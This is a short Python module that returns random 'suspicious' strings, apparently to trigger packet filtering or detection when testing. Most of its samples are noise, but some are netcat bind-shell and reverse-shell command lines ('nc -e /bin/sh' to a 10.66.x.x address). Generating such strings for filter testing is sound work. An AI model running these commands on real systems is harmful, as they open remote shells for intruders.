"""Provides a method for suspicious strings."""
import base64
import os
import random
from pathlib import Path


with open(Path(__file__).parent / "words.txt", "r") as filed:
    _all_words = filed.read().split("\n")
_words = [x.strip() for x in _all_words if len(x.strip()) >= 6 and len(x.strip()) <= 50]


def generate_suspicious_message(max_length=None):
    """Returns a string that hopefully triggers some packet filtering."""

    # OPT: add more from siccegges examples
    choice = random.choice([
        os.urandom(random.randint(4, 16)).hex(),
        base64.b64encode(os.urandom(random.randint(4, 16))).decode(),
        'A' * random.randint(4, 64),
        'a' * random.randint(4, 64),
        'B' * random.randint(4, 64),
        'b' * random.randint(4, 64),
        'Never gonna give you up',
        'Never gonna let you down',
        '/bin/sh -c /bin/sh',
        '/bin/sh',
        '/bin/{} -l -p {} -e /bin/sh'.format(
            random.choice(['nc', 'ncat', 'netcat']),
            random.randint(1024, 65535)),
        '/bin/{} -e /bin/sh 10.66.{}.{} {}'.format(
            random.choice(['nc', 'ncat', 'netcat']),
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(1024, 65535)),
        ])

    if max_length:
        choice = choice[:max_length]
    return choice


def get_random_string():
    """Returns a random string from the given sample words."""
    return random.choice(_words)
